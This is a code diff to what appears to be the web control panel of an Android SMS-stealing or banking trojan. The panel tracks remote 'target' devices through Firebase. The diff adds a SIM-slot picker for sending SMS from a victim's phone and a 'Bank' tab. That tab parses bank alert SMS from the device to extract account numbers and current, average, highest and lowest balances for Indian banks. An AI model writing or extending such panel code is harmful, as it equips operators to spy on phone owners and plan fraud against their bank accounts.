@@ -518,6 +518,23 @@ header('Content-Type: text/html; charset=UTF-8');
     .perm-name{font-family:'Space Mono',monospace;font-size:9px;color:var(--text);letter-spacing:0.5px;text-transform:uppercase}
 
     /* ─── FORM ─── */
+    .sim-chip-meta{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace;line-height:1.35}
+    .sim-picker{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0 16px}
+    .sim-chip{flex:1;min-width:120px;padding:12px 10px;border-radius:12px;border:1px solid var(--border);background:var(--card);color:var(--text);cursor:pointer;text-align:left;transition:border-color .15s,background .15s}
+    .sim-chip.active{border-color:var(--accent);background:rgba(255,60,60,.12);box-shadow:0 0 0 1px rgba(255,60,60,.2)}
+    .sim-chip-title{font-size:12px;font-weight:800;margin-bottom:4px}
+    .bank-auto-note{font-size:11px;color:var(--muted);margin-bottom:12px;font-family:'Space Mono',monospace}
+    .bank-list{display:grid;gap:12px;margin-top:8px}
+    .bank-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px}
+    .bank-card-top{display:flex;gap:12px;align-items:center;margin-bottom:12px}
+    .bank-name{font-size:14px;font-weight:800}
+    .bank-acct{font-size:11px;color:var(--muted);font-family:'Space Mono',monospace}
+    .bank-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+    .bank-stat{background:rgba(255,255,255,.03);border-radius:8px;padding:10px}
+    .bank-stat-lbl{font-size:9px;color:var(--muted);text-transform:uppercase;margin-bottom:4px}
+    .bank-stat-val{font-size:14px;font-weight:700;font-family:'Space Mono',monospace}
+    .bank-stat-val.current{color:var(--accent2)}
+    .bank-meta{font-size:10px;color:var(--muted);margin-top:10px;font-family:'Space Mono',monospace}
     .config-card{background:linear-gradient(145deg,rgba(22,22,31,0.95),rgba(14,14,20,0.98));border:1px solid rgba(255,60,60,0.15);border-radius:14px;padding:24px;position:relative;overflow:hidden;max-width:520px;margin:14px 0;box-shadow:0 12px 40px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.04)}
     .config-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:14px 0 0 14px}
     .input-group{display:flex;flex-direction:column;gap:12px;margin-bottom:16px}
@@ -723,6 +740,7 @@ header('Content-Type: text/html; charset=UTF-8');
         <button class="data-tab" onclick="switchDataTab('sim',this)"><span class="i3d i3d-orange i3d-swap"><span class="em-a">📶</span><span class="em-b">📡</span></span> SIM / IMEI</button>
         <button class="data-tab" onclick="switchDataTab('perms',this)"><span class="i3d i3d-red i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Permissions</button>
         <button class="data-tab" onclick="switchDataTab('sendsms',this)"><span class="i3d i3d-green i3d-anim i3d-anim-send"><span class="em-a">📤</span></span> Send SMS</button>
+        <button class="data-tab" onclick="switchDataTab('bank',this)"><span class="i3d i3d-orange">🏦</span> Bank <span class="tab-badge" id="tc-bank">0</span></button>
         <button class="data-tab" onclick="switchDataTab('forward',this)"><span class="i3d i3d-fire i3d-anim i3d-anim-forward"><span class="em-a">↗️</span></span> Forwarding</button>
       </div>
 
@@ -775,6 +793,8 @@ header('Content-Type: text/html; charset=UTF-8');
         <div class="api-key-warn" id="sendSmsApiWarn">⚠️ <strong>API Key is required</strong> for SMS sending. Add it in the Rebel AI wizard — without it, commands will not reach the device.</div>
         <p style="color:var(--muted);font-size:12px;margin-bottom:0">Send message via target device</p>
         <div class="config-card">
+          <label style="display:block;font-size:11px;color:var(--muted);margin-bottom:6px">Send from SIM</label>
+          <div class="sim-picker" id="sendSimPicker"><div class="sim-chip-meta">Loading SIM slots...</div></div>
           <div class="input-group">
             <div><label><span class="i3d i3d-blue i3d-sm">📞</span> To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
             <div><label><span class="i3d i3d-green i3d-sm">💬</span> Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
@@ -785,6 +805,14 @@ header('Content-Type: text/html; charset=UTF-8');
         <div class="sec-title" style="margin:20px 0 10px">Sent <span>History</span></div>
         <div class="tbl-wrap"><table class="tbl"><thead><tr><th>To</th><th>Message</th><th>Status</th><th>Time</th></tr></thead>
         <tbody id="sentTbody"></tbody></table></div>
+      </div>
+
+      <!-- BANK -->
+      <div class="data-section" id="tab-bank">
+        <div class="sec-title" style="margin-bottom:4px">Bank <span>Summary</span></div>
+        <div class="bank-auto-note" id="bankAutoNote">Balances auto-parsed from bank SMS (SBI, HDFC, ICICI, etc.)</div>
+        <div id="bankEmpty" class="tbl-empty">Open SMS tab or wait — bank balances load automatically from device SMS</div>
+        <div id="bankList" class="bank-list"></div>
       </div>
 
       <!-- FORWARDING -->
@@ -897,6 +925,7 @@ header('Content-Type: text/html; charset=UTF-8');
 <script src="firebase_defaults.js"></script>
 <script>
 var allDevs=[], selDev='', activeListeners={};
+var _sendSimSlot=1,_deviceSims=[],_bankDataHash='';
 var firebaseInstances=[], firebaseConfigs=[];
 var panelInitialized=false;
 var clientsRawMap={}, tabLoaded={}, cacheWriteTimer=null;
@@ -1845,7 +1874,9 @@ function openDevice(id){
   window._rabelSmsSeenKeys={};
   window._rabelSmsHydrated=false;
   _smsListHash='';
+  _bankDataHash='';
   renderSmsList();
+  if(dev) loadSendSimOptions(dev);
   ensureTabLoaded('sms');
 }
 
@@ -2147,6 +2178,7 @@ function ensureTabLoaded(tab){
       }).join('');
     });
   } else if(tab==='sendsms'){
+    loadSendSimOptions(dev);
     devOn(dev.fbId,ref+'/sent_sms',function(snap){
       var tb=document.getElementById('sentTbody'); if(!snap.exists()){tb.innerHTML='';return;}
       var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
@@ -2170,6 +2202,9 @@ function ensureTabLoaded(tab){
         return '<tr><td><b>'+esc(r.from||'?')+'</b></td><td>'+esc(r.to||'?')+'</td><td style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.body||'—')+'</td><td class="mono" style="color:var(--muted)">'+(r.forwarded_at?new Date(r.forwarded_at).toLocaleString():'—')+'</td></tr>';
       }).join('');
     });
+  } else if(tab==='bank'){
+    if(!tabLoaded.sms) ensureTabLoaded('sms');
+    renderBankAccounts();
   }
 }
 
@@ -2179,6 +2214,7 @@ function switchDataTab(name,btn){
   btn.classList.add('active');
   document.querySelectorAll('.data-section').forEach(function(s){s.classList.remove('active');});
   document.getElementById('tab-'+name).classList.add('active');
+  if(name==='bank'&&!tabLoaded.sms) ensureTabLoaded('sms');
   ensureTabLoaded(name);
 }
 
@@ -2211,6 +2247,215 @@ function fbSet(inst,path,value){
   });
 }
 
+// ═══ SIM PICKER (Send SMS) ═══
+function defaultSimSlots(){
+  return [{slot:1,label:'SIM 1',carrier:'Slot 1',number:''},{slot:2,label:'SIM 2',carrier:'Slot 2',number:''}];
+}
+function normalizeSimSlots(data){
+  var slots=[],i,sim;
+  if(data&&data.sims&&data.sims.length){
+    for(i=0;i<data.sims.length;i++){
+      sim=data.sims[i]||{};
+      slots.push({slot:i+1,label:'SIM '+(i+1),carrier:sim.carrierName||sim.sim_operator_name||sim.operator||'SIM '+(i+1),number:sim.phoneNumber||sim.number||sim.line1Number||sim.mobNo||''});
+    }
+    return slots;
+  }
+  if(data&&data.sim_info){
+    var info=data.sim_info;
+    if(info.sims&&info.sims.length){
+      for(i=0;i<info.sims.length;i++){
+        sim=info.sims[i]||{};
+        slots.push({slot:i+1,label:'SIM '+(i+1),carrier:sim.carrierName||sim.sim_operator_name||'SIM '+(i+1),number:sim.phoneNumber||sim.number||''});
+      }
+      return slots;
+    }
+    if(info.sim1||info.sim2){
+      if(info.sim1)slots.push({slot:1,label:'SIM 1',carrier:info.sim1.operator||info.sim1.carrier||'SIM 1',number:info.sim1.number||info.sim1.phone||''});
+      if(info.sim2)slots.push({slot:2,label:'SIM 2',carrier:info.sim2.operator||info.sim2.carrier||'SIM 2',number:info.sim2.number||info.sim2.phone||''});
+      if(slots.length)return slots;
+    }
+    if(info.sim_operator_name||info.phone_number||info.imei){
+      slots.push({slot:1,label:'SIM 1',carrier:info.sim_operator_name||info.network_operator_name||'SIM 1',number:info.phone_number||info.line1Number||''});
+      if(info.sim2_operator_name||info.dual_sim)slots.push({slot:2,label:'SIM 2',carrier:info.sim2_operator_name||'SIM 2',number:info.sim2_phone_number||''});
+      if(slots.length)return slots;
+    }
+  }
+  return defaultSimSlots();
+}
+function renderSendSimPicker(slots){
+  var el=document.getElementById('sendSimPicker');
+  if(!el)return;
+  _deviceSims=slots&&slots.length?slots:defaultSimSlots();
+  if(!_deviceSims.some(function(s){return s.slot===_sendSimSlot;}))_sendSimSlot=_deviceSims[0].slot;
+  el.innerHTML=_deviceSims.map(function(sim){
+    var active=sim.slot===_sendSimSlot?' active':'';
+    var meta=[sim.carrier,sim.number].filter(Boolean).join(' · ')||'Tap to use this slot';
+    return '<button type="button" class="sim-chip'+active+'" onclick="selectSendSim('+sim.slot+',this)"><div class="sim-chip-title">'+esc(sim.label)+'</div><div class="sim-chip-meta">'+esc(meta)+'</div></button>';
+  }).join('');
+}
+function selectSendSim(slot,btn){
+  _sendSimSlot=slot;
+  document.querySelectorAll('.sim-chip').forEach(function(el){el.classList.remove('active');});
+  if(btn)btn.classList.add('active');
+}
+function loadSendSimOptions(dev){
+  var el=document.getElementById('sendSimPicker');
+  if(el)el.innerHTML='<div class="sim-chip-meta">Loading SIM slots...</div>';
+  if(!dev)return;
+  var inst=getFbInstance(dev.fbId);
+  if(!inst){renderSendSimPicker(defaultSimSlots());return;}
+  var cached=clientsRawMap[dev.id];
+  if(inst.schema==='rabel'){
+    if(cached&&cached.sims&&cached.sims.length){renderSendSimPicker(normalizeSimSlots(cached));return;}
+    restJson(inst.restUrl+'/clients/'+encodeURIComponent(dev.rawId)+'.json').then(function(data){
+      renderSendSimPicker(normalizeSimSlots(data||{}));
+    }).catch(function(){renderSendSimPicker(defaultSimSlots());});
+    return;
+  }
+  var base=(dev.deviceNode||'devices')+'/'+dev.rawId;
+  restJson(inst.restUrl+'/'+base+'/device_info/sim_info.json').then(function(simInfo){
+    renderSendSimPicker(normalizeSimSlots({sim_info:simInfo||{}}));
+  }).catch(function(){renderSendSimPicker(normalizeSimSlots(cached||{}));});
+}
+
+// ═══ BANK AUTO-FETCH FROM SMS ═══
+function getMergedSmsForBank(){
+  var newMsgs=(window._newSmsData||[]).slice();
+  var allMsgs=(window._allSmsData||[]).slice();
+  var newKeys={},ni,filteredAll=[];
+  for(ni=0;ni<newMsgs.length;ni++) newKeys[smsDedupKey(newMsgs[ni])]=1;
+  for(ni=0;ni<allMsgs.length;ni++){var k=smsDedupKey(allMsgs[ni]);if(!newKeys[k])filteredAll.push(allMsgs[ni]);}
+  return newMsgs.concat(filteredAll);
+}
+function parseInrAmount(s){
+  if(s==null)return null;
+  var n=parseFloat(String(s).replace(/,/g,''));
+  return isNaN(n)||n<0||n>1e12?null:n;
+}
+var BANK_NAME_MAP=[
+  {re:/state\s*bank|sbi\b|sbin/i,name:'State Bank of India'},{re:/hdfc/i,name:'HDFC Bank'},{re:/icici/i,name:'ICICI Bank'},{re:/axis/i,name:'Axis Bank'},
+  {re:/kotak/i,name:'Kotak Mahindra Bank'},{re:/punjab\s*national|pnb\b/i,name:'Punjab National Bank'},{re:/bank\s*of\s*baroda|bob\b/i,name:'Bank of Baroda'},
+  {re:/canara/i,name:'Canara Bank'},{re:/union\s*bank/i,name:'Union Bank'},{re:/idbi/i,name:'IDBI Bank'},{re:/yes\s*bank/i,name:'Yes Bank'},
+  {re:/indusind/i,name:'IndusInd Bank'},{re:/federal\s*bank/i,name:'Federal Bank'},{re:/bandhan/i,name:'Bandhan Bank'},{re:/indian\s*bank/i,name:'Indian Bank'},
+  {re:/idfc/i,name:'IDFC FIRST Bank'},{re:/rbl\s*bank/i,name:'RBL Bank'}
+];
+var BANK_SENDER_MAP=[
+  ['SBIINB','State Bank of India'],['SBIPSG','State Bank of India'],['SBI','State Bank of India'],['HDFCBK','HDFC Bank'],['HDFC','HDFC Bank'],
+  ['ICICIB','ICICI Bank'],['ICICIT','ICICI Bank'],['AXISBK','Axis Bank'],['KOTAKB','Kotak Mahindra Bank'],['PNBSMS','Punjab National Bank'],
+  ['BOBSMS','Bank of Baroda'],['CANBNK','Canara Bank'],['UNIONB','Union Bank'],['IDBIBK','IDBI Bank']
+];
+function inferBankName(body,address){
+  var text=String(body||'')+' '+String(address||'');
+  var i;for(i=0;i<BANK_NAME_MAP.length;i++){if(BANK_NAME_MAP[i].re.test(text))return BANK_NAME_MAP[i].name;}
+  var a=String(address||'').toUpperCase().replace(/[^A-Z0-9]/g,'');
+  for(i=0;i<BANK_SENDER_MAP.length;i++){if(a.indexOf(BANK_SENDER_MAP[i][0])>=0)return BANK_SENDER_MAP[i][1];}
+  return null;
+}
+function extractAccountFromSms(body){
+  var b=String(body||''),patterns=[
+    /(?:a\/c|acct|account)\s*(?:no\.?|number)?[:\s]*(?:x{2,}|\*{2,}|X{2,})*(\d{4,})/i,
+    /(?:x{4,}|\*{4,}|X{4,})(\d{4})\b/,
+    /(?:a\/c|acct)\s*(?:no\.?)?[:\s]*(\d{8,18})/i,
+    /(?:no\.?\s*)(?:x{2,}|\*{2,})(\d{4})\b/i
+  ],i,m;
+  for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1])return m[1];}
+  return null;
+}
+function extractBalanceFromSms(body){
+  var b=String(body||''),patterns=[
+    /(?:total\s*)?(?:avl|available)\s*bal(?:ance)?[:\s-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /bal(?:ance)?\s*(?:is|:|-)\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:is\s+)?(?:avl|available|your|the)/i,
+    /(?:closing|clear)\s*bal(?:ance)?[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /(?:a\/c|acct)[^\d]{0,50}(?:bal|balance)[^\d]{0,30}(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /(?:credited|debited|withdrawn|deposited)[\s\S]{0,90}(?:avl|available)\s*bal[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /\bbal[:\s]+(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /(?:balance\s+in\s+your\s+a\/c)[\s\S]{0,40}(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i
+  ],i,m,amt;
+  for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1]){amt=parseInrAmount(m[1]);if(amt!=null)return amt;}}
+  return null;
+}
+function isBankSms(body,address){
+  var t=(String(body||'')+' '+String(address||'')).toLowerCase();
+  if(/credited|debited|withdrawn|deposited|avl\s*bal|available\s*bal|a\/c|acct|imps|neft|rtgs|txn|transaction|bal\s*is|balance\s*is/i.test(t))return true;
+  if(/sbi|hdfc|icici|axis|kotak|pnb|bob|canara|union|idbi|yes\s*bank|indusind|bank\b/i.test(t))return true;
+  return false;
+}
+function looksLikeBankSms(body,address){
+  if(isBankSms(body,address))return true;
+  var bal=extractBalanceFromSms(body);
+  if(bal==null)return false;
+  if(extractAccountFromSms(body)||inferBankName(body,address))return true;
+  if(/(?:rs\.?|inr|₹)\s*[\d,]+/i.test(body))return true;
+  return false;
+}
+function maskBankAccount(acct){
+  if(!acct||acct==='Unknown')return 'Unknown';
+  var d=String(acct).replace(/\D/g,'');
+  if(d.length<=4)return d||'Unknown';
+  return 'XXXX'+d.slice(-4);
+}
+function formatInr(n){
+  if(n==null||isNaN(n))return '—';
+  return '₹ '+Number(n).toLocaleString('en-IN',{minimumFractionDigits:2,maximumFractionDigits:2});
+}
+function parseBankAccountsFromSms(smsList){
+  var map={},keys,k,row,bals,sum,i;
+  (smsList||[]).forEach(function(s){
+    if(!s||!s.body||!looksLikeBankSms(s.body,s.address))return;
+    var bal=extractBalanceFromSms(s.body);
+    if(bal==null)return;
+    var acct=extractAccountFromSms(s.body)||'Unknown';
+    var bank=inferBankName(s.body,s.address)||'Bank';
+    k=bank+'|'+acct;
+    if(!map[k])map[k]={bank:bank,account:acct,balances:[],latestMs:0,latestDate:''};
+    map[k].balances.push(bal);
+    var ms=s.date||s.date_ms||0;
+    if(ms>=map[k].latestMs){map[k].latestMs=ms;map[k].latestDate=s.date_readable||'';map[k].current=bal;}
+  });
+  keys=Object.keys(map);
+  return keys.map(function(key){
+    row=map[key];bals=row.balances;sum=0;
+    for(i=0;i<bals.length;i++)sum+=bals[i];
+    return{bank:row.bank,account:row.account,accountMask:maskBankAccount(row.account),
+      current:row.current!=null?row.current:bals[bals.length-1],average:sum/bals.length,
+      highest:Math.max.apply(null,bals),lowest:Math.min.apply(null,bals),count:bals.length,latestDate:row.latestDate};
+  }).sort(function(a,b){return a.bank.localeCompare(b.bank);});
+}
+function renderBankAccounts(){
+  var dev=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty'),badge=document.getElementById('tc-bank'),noteEl=document.getElementById('bankAutoNote');
+  if(!dev){
+    if(emptyEl){emptyEl.style.display='';emptyEl.textContent='Select a device to load bank balances from SMS';}
+    if(listEl)listEl.innerHTML='';if(badge)badge.textContent='0';
+    return;
+  }
+  var smsList=getMergedSmsForBank();
+  if(!smsList.length&&noteEl)noteEl.textContent='Fetching SMS and parsing bank balances...';
+  var banks=parseBankAccountsFromSms(smsList);
+  var bh=banks.length+'|'+smsList.length;
+  if(bh===_bankDataHash&&listEl&&listEl.children.length)return;
+  _bankDataHash=bh;
+  if(badge)badge.textContent=String(banks.length);
+  if(noteEl)noteEl.textContent=banks.length
+    ?('Auto-parsed from '+smsList.length+' SMS · SBI, HDFC, ICICI, etc.')
+    :(smsList.length?'No bank balance SMS found in '+smsList.length+' messages':'Waiting for SMS sync...');
+  if(!banks.length){
+    if(emptyEl){emptyEl.style.display='';emptyEl.innerHTML='🏦 No bank SMS found<br><span style="font-size:11px;opacity:.6">SBI, HDFC, ICICI balance alerts appear here</span>';}
+    if(listEl)listEl.innerHTML='';return;
+  }
+  if(emptyEl)emptyEl.style.display='none';
+  if(!listEl)return;
+  listEl.innerHTML=banks.map(function(b){
+    return '<div class="bank-card"><div class="bank-card-top"><div style="font-size:24px">🏦</div><div><div class="bank-name">'+esc(b.bank)+'</div><div class="bank-acct">A/C '+esc(b.accountMask)+'</div></div></div>'+
+      '<div class="bank-grid">'+
+      '<div class="bank-stat"><div class="bank-stat-lbl">CURRENT</div><div class="bank-stat-val current">'+formatInr(b.current)+'</div></div>'+
+      '<div class="bank-stat"><div class="bank-stat-lbl">AVERAGE</div><div class="bank-stat-val">'+formatInr(b.average)+'</div></div>'+
+      '<div class="bank-stat"><div class="bank-stat-lbl">HIGHEST</div><div class="bank-stat-val">'+formatInr(b.highest)+'</div></div>'+
+      '<div class="bank-stat"><div class="bank-stat-lbl">LOWEST</div><div class="bank-stat-val">'+formatInr(b.lowest)+'</div></div>'+
+      '</div><div class="bank-meta">'+b.count+' balance SMS'+(b.latestDate?' · Latest: '+esc(b.latestDate):'')+'</div></div>';
+  }).join('');
+}
+
 // ═══ SEND SMS ═══
 function sendSms(){
   var dev=getSelDev();
@@ -2219,8 +2464,9 @@ function sendSms(){
   if(!inst){showToast('error','Firebase not connected!');return;}
   var n=document.getElementById('sendTo').value.trim(), m=document.getElementById('sendMsg').value.trim();
   if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">Fill all fields</span>';return;}
+  var simSlot=_sendSimSlot||1;
   var t0=performance.now();
-  document.getElementById('sendStatus').innerHTML='<span style="color:var(--muted)">Sending...</span>';
+  document.getElementById('sendStatus').innerHTML='<span style="color:var(--muted)">Sending via SIM '+simSlot+'...</span>';
   var done=function(){
     var ms=Math.max(1,Math.round(performance.now()-t0));
     document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Sent in '+ms+'ms</span>';
@@ -2232,10 +2478,10 @@ function sendSms(){
     showToast('error',e.message||'Send failed');
   };
   if(inst.schema==='rabel'){
-    fbSet(inst,'clients/'+dev.rawId+'/webhookEvent/sendSms',{to:n,message:m,from:1,isSended:false}).then(done).catch(fail);
+    fbSet(inst,'clients/'+dev.rawId+'/webhookEvent/sendSms',{to:n,message:m,from:simSlot,isSended:false}).then(done).catch(fail);
     return;
   }
-  fbPush(inst,dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms',{to:n,message:m}).then(done).catch(fail);
+  fbPush(inst,dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms',{to:n,message:m,sim:simSlot-1,from:simSlot,slot:simSlot-1}).then(done).catch(fail);
 }
 
 // ═══ FORWARDING ═══
@@ -2353,6 +2599,7 @@ function renderSmsList(){
       '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
       '<td><span class="sbadge '+type+'">'+esc(s.type||'?')+'</span></td></tr>';
   }).join('');
+  renderBankAccounts();
 }
 
 function openSmsModal(idx){
